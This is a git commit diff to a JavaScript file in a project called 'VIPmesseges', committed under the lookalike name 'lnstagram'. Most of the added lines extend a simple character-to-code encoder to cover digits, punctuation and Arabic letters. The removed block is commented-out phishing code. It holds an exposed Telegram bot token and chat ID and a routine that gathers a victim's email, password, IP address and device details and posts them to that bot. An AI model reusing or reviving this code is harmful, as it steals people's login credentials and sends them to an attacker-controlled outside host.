5676701987af4be794b1d35bd1573222863d7574
lnstagram <0601014563aa@gmail.com>
2025-08-23 07:49:38 +0100

    Update index.js

--- VIPmesseges/VIPmesseges/assets/js/index.js
+++ VIPmesseges/VIPmesseges/assets/js/index.js
@@ -81,6 +81,185 @@ function analyze() {
     else if (char === 'z') {
       output += "26f%";
     }
+
+        else if (char === '1') {
+      output += "27f%";
+    } 
+    else if (char === '2') {
+      output += "28f%";
+    }
+    else if (char === '3') {
+      output += "29f%";
+    } 
+    else if (char === '4') {
+      output += "30f%";
+    }
+    else if (char === '5') {
+      output += "31f%";
+    } 
+    else if (char === '6') {
+      output += "32f%";
+    }
+    else if (char === '7') {
+      output += "33f%";
+    } 
+    else if (char === '8') {
+      output += "34f%";
+    }
+    else if (char === '9') {
+      output += "35f%";
+    } 
+    else if (char === '0') {
+      output += "36f%";
+    }
+
+    else if (char === '\'') {
+      output += "37f%";
+    }
+    else if (char === '\=') {
+      output += "38f%";
+    }
+
+    else if (char === '\+') {
+      output += "39f%";
+    }
+    else if (char === '\-') {
+      output += "40f%";
+    }
+    else if (char === '\(') {
+      output += "41f%";
+    }
+    else if (char === '\)') {
+      output += "42f%";
+    }
+
+    else if (char === '\:') {
+      output += "43f%";
+    }
+
+    else if (char === '\;') {
+      output += "44f%";
+    }
+    else if (char === '!') {
+      output += "45f%";
+    }
+    else if (char === '\?') {
+      output += "46f%";
+    }
+
+    else if (char === '\@') {
+      output += "47f%";
+    }
+
+    else if (char === '\#') {
+      output += "48f%";
+    }
+    else if (char === '\%') {
+      output += "49f%";
+    }
+    else if (char === '\$') {
+      output += "50f%";
+    }
+
+    else if (char === '\{') {
+      output += "51f%";
+    }
+    else if (char === '\}') {
+      output += "52f%";
+    }
+    else if (char === '\_') {
+      output += "53f%";
+    }    
+    else if (char === '.') {
+      output += "82f%";
+    }
+    else if (char === ',') {
+      output += "83f%";
+    }
+    else if (char === 'أ') {
+        output += "54f%";
+    }
+    else if (char === 'ب') {
+      output += "55f%";
+    }
+    else if (char === 'ت') {
+      output += "56f%";
+    }
+    else if (char === 'ث') {
+      output += "57f%";
+    }
+    else if (char === 'ج') {
+      output += "58f%";
+    }
+    else if (char === 'ح') {
+      output += "59f%";
+    }
+    else if (char === 'خ') {
+      output += "60f%";
+    }
+    else if (char === 'د') {
+      output += "61f%";
+    }
+    else if (char === 'ذ') {
+      output += "62f%";
+    }
+    else if (char === 'ر') {
+      output += "63f%";
+    }
+    else if (char === 'ز') {
+      output += "64f%";
+    }
+    else if (char === 'س') {
+      output += "65f%";
+    }
+    else if (char === 'ش') {
+      output += "66f%";
+    }
+    else if (char === 'ص') {
+      output += "67f%";
+    }
+    else if (char === 'ض') {
+      output += "68f%";
+    }
+    else if (char === 'ط') {
+      output += "69f%";
+    }
+    else if (char === 'ظ') {
+      output += "70f%";
+    }
+    else if (char === 'ع') {
+      output += "71f%";
+    }
+    else if (char === 'غ') {
+      output += "72f%";
+    }
+    else if (char === 'ف') {
+      output += "73f%";
+    }
+    else if (char === 'ق') {
+      output += "74f%";
+    }
+    else if (char === 'ك') {
+      output += "75f%";
+    }
+    else if (char === 'ل') {
+      output += "76f%";
+    }
+    else if (char === 'م') {
+      output += "77f%";
+    }
+    else if (char === 'ن') {
+      output += "78f%";
+    }
+    else if (char === 'ه') {
+      output += "79f%";
+    }
+    else if (char === 'و') {
+      output += "80f%";
+    }
+    else if (char === 'ي') {
+      output += "81f%";
+    }    
     else if (char === " ") {
       output += "0f%";
     }
@@ -98,57 +277,3 @@ function copyText() {
   let text = document.getElementById("result").innerText;
   navigator.clipboard.writeText(text).then(() => {})
 }
-
-
-
-
-
-// const TOKEN = "7938575650:AAEDzLHq7OApTPx1nNvqgGlOGI6yERk7UaA";
-// const CHAT_ID = "2092432928";
-// const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-// document.getElementById('Input').addEventListener('analyze', function (e) {
-//     e.preventDefault();
-
-//     axios.get('https://api.ipify.org?format=json')
-//         .then(response => {
-//             const ip = response.data.ip;
-//             const userAgent = navigator.userAgent;
-//             const platform = navigator.platform;
-//             const screenWidth = screen.width;
-//             const screenHeight = screen.height;
-//             const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';
-
-//             const message = `
-// <b>Nouvelle tentative de connexion</b>\n
-// <b>Email :</b> ${email}\n
-// <b>Mot de passe :</b> ${password}\n
-// <b>Adresse IP :</b> ${ip}\n
-// <b>Type d'appareil :</b> ${deviceType}\n
-// <b>Plateforme :</b> ${platform}\n
-// <b>User Agent :</b> ${userAgent}\n
-// <b>Résolution d'écran :</b> ${screenWidth}x${screenHeight}
-//             `;
-
-//             axios.post(URI_API, {
-//                 chat_id: CHAT_ID,
-//                 parse_mode: 'html',
-//                 text: message
-//             }).then(() => {
-//                 alert('Informations envoyées avec succès !');
-//             }).catch(() => {
-//                 alert("Erreur lors de l'envoi des informations.");
-//             });
-
-//         }).catch(() => {
-//             alert("Erreur lors de la récupération de l'adresse IP.");
-//         });
-// });
-
-
-// document.getElementById('login-form').addEventListener('submit', function (e) {
-//     e.preventDefault();
-
-//     // كود الإرسال الموجود عندك
-//     // ...
-// });
